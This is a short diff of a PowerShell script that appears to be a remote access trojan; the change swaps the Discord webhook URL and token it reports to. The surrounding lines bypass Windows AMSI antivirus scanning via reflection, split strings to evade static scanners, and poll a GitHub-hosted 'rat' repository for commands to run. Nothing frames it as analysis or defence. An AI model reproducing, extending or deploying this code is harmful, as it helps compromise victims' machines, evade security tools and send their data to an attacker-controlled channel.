@@ -8,7 +8,7 @@ $R.GetField('ams'+'iContext','NonPublic,Static').SetValue($R,$null)
 
 # ---- Config (strings split to dodge static scanning) ----
 $C='https://raw.githubusercontent.com/'+'kaikssaqes/'+'rat/'+'main/'+'cmd.txt'
-$W='https://discord.com/api/webhooks/'+'1549954992381894696/'+'hPbSMjMJvKFzPt5ttEAlYNiBVNs-cUNt-aMSSvAtyAypP5qLDia9OjHaFfzB7YgA465c'
+$W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'Z1NukXzFi0yUb1kjQdvWti7E_3PQGwHwoYcls0zbclywzZ9YL86NBWem8bVgI5BCSWdo'
 $S=Join-Path $env:TEMP 'r_s.tmp'     # last-executed command state
 $script:P=30000                       # poll interval (ms)
 
